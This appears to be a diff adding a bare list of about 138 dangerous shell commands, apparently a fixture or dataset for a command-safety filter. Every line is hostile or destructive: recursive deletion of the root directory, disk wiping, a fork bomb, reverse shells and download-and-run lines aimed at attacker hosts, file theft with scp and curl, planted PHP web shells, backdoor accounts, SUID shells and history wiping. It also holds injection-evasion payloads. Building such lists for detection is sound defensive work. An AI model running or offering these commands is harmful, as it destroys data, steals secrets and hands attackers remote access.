@@ -1,0 +1,138 @@
+zip --symlinks archive.zip ../../../etc/passwd
+rm -rf /
+exiftool -Comment="<?php system($_POST['cmd']); ?>" backdoor.jpg
+echo 'DELETE FROM users;' | mysql -u root -p
+ln -s /etc/passwd badlink && tar -cvf archive.tar badlink
+kill -9 -1
+:(){ :|:& };:
+TF=$(mktemp); echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF; sudo apt install -c $TF cowsay
+wget http://evil.com/malware.sh -O- | bash
+echo 'php -r "system($_GET[cmd]);"' > /var/www/html/shell.php
+iptables -F
+rm -rf --no-preserve-root /
+chown -R root:root /
+chmod -R 777 /
+python3 -c "import os; os.system('rm -rf /')"
+dd if=/dev/zero of=/dev/sda
+find / -name '*' -delete
+perl -e 'system("rm -rf /")'
+mkfs.ext4 /dev/sda
+curl -s http://malicious.site/script.sh | sh
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
+psql -o'|id>/tmp/foo'
+echo 1/*$(sleep 5)`sleep 5`
+$(tr '!-0' '"-1' <<< .)etc$(tr '!-0' '"-1' <<< .)passwd
+'w'hoami
+php -r 'echo shell_exec("ls");'
+echo 1;sleep${IFS}5
+echo $(cat /etc/passwd)
+echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+wh''oami
+cat /etc/$(echo 'passwd')
+cat${IFS}/etc/passwd
+$(echo whoami)
+echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9
+eval "\$(curl http://mal.site/evil.sh)"
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+$(base64 -d <<< Y2F0IC9ldGMvcGFzc3dk)
+`echo whoami`
+X=$'uname\x20-a'&&$X
+echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9"
+chmod 777 /etc/shadow
+nc -e /bin/bash attacker.com 444
+echo 'malicious_code' >> ~/.bashrc
+ssh-keygen -f ~/.ssh/id_rsa -N ' '
+export HISTFILE=/dev/null
+cp /bin/bash /tmp/sh && chmod +s /tmp/sh
+python3 -m http.server 8080 &
+mv /etc/passwd /dev/null
+chmod +s /bin/bash
+adduser root2
+curl http://attacker.com/evil.sh | bash
+echo "*/1 * * * * root curl attacker.com/m.sh | sh" >> /etc/crontab
+iptables -P INPUT ACCEPT && iptables -F
+killall -9 sshd
+useradd -ou 0 -g 0 backdoor
+echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd
+cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
+rm -rf ~/.bash_history
+unset HISTFILE
+chmod u+s /usr/bin/find
+nc -lvp 4444 -e /bin/sh
+echo 'alias ls="rm -rf /"' >> ~/.bashrc
+python -c 'import pty;pty.spawn("/bin/bash")'
+perl -e 'exec "/bin/sh";'
+( sleep 10 ; reboot ) &
+ln -s / /tmp/root
+cp /bin/sh /tmp/.hidden && chmod +s /tmp/.hidden
+rm -rf ~/.ssh/
+scp ~/.bash_history attacker@evil.com:/tmp/
+history -c
+cat /etc/passwd > /tmp/passwd.bak
+find / -perm -4000
+chmod 666 /etc/passwd
+echo "nameserver 8.8.8.8" > /etc/resolv.conf
+dd if=/dev/zero of=/dev/mem
+mount -o bind / /mnt
+cp /etc/shadow /tmp/shadow_copy
+python3 -c "import os; os.system('rm -rf / --no-preserve-root')"
+(while true; do :; done) &
+rm -rf /*
+touch /etc/cron.d/malcron
+echo "root::0:0::/root:/bin/bash" >> /etc/passwd
+wget http://evil.com/b.sh -O - | bash
+openssl passwd -1 'toor' >> /etc/shadow
+tcpdump -i any -w /tmp/capture.pcap &
+dd if=/dev/random of=/dev/sda bs=512
+echo "set +o history" >> ~/.bashrc
+setenforce 0
+systemctl stop firewalld
+rm -i labrador.jpeg
+sudo find / -name "*" -exec rm {} \;
+mkfs.ext3 /dev/sdb
+sh ./install.sh
+! (( $RANDOM % 6 )) && rm -rf / || echo "You live"
+echo 'os.execute("/bin/sh")' > /tmp/tf.lua
+nmap --script=/tmp/tf.lua
+bash -c 'ping -c 1 127.0.0.1; id'
+dig ;cat /etc/passwd
+sleep${IFS}5
+nslookup $(whoami).x.oastify.com
+tar --use-compress-program='sleep 5 ' -cf /tmp/etc_passwd.tar /etc/passwd
+touch -- $user_input
+rm -rf /var/log/*
+echo "#!/bin/bash" > backdoor.sh && echo "rm -rf /" >> backdoor.sh
+mkfs.vfat /dev/sdc1
+bash -i >& /dev/tcp/attacker.com/8080 0>&1
+> important_data.txt
+dd if=/dev/zero of=/dev/null
+cat /etc/passwd > exfil.txt
+curl -T exfil.txt http://attacker.com/upload
+cp /bin/bash /tmp/bsh && chmod +s /tmp/bsh
+echo "<?php system($_GET['cmd']); ?>" > /var/www/html/shell.php
+printf '#!/bin/bash\nrm -rf /' > /usr/local/bin/cleanup && chmod +x /usr/local/bin/cleanup
+yes | mkfs.ext3 /dev/sdx
+rm -rf ~/Downloads/*
+bash -c "$(curl -fsSL http://evil.site/evil.sh)"
+scp -r /etc attacker@evil.com:/tmp/etc
+find / -type f -name '*.log' -delete
+nmap --script=http-shellshock --script-args uri=/cgi-bin/test.cgi
+tar cf archive.tar --use-compress-program="rm -rf /" /home/user
+wget -q http://malicious.com/payload.sh -O- | bash
+nc attacker.com 4444 -e /bin/bash
+find /home -name "*" -exec rm -rf {} \;
+rsync -a /etc attacker@evil.com:/tmp/etc
+ln -s /etc/shadow /tmp/shadow_link
+curl http://evil.site/$(whoami).sh | bash
+python -c "import os; os.system('wget http://attacker.com/x.sh -O- | sh')"
+touch "$(cat /tmp/user_input)"
+find / -exec sh -c 'rm -rf {}' \;
+perl -e 'system("mkfs.ext4 /dev/sda")'
+xargs -a files.txt rm -rf
+sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
+echo 'crash' > /proc/sysrq-trigger
+logger "Injected by attacker"
+tar -czf /tmp/home.tar.gz /home && curl -T /tmp/home.tar.gz http://attacker.com/
+awk 'BEGIN { system("rm -rf /") }'
+echo "$(whoami) connected" >> /etc/motd
+mv /home/* /dev/null
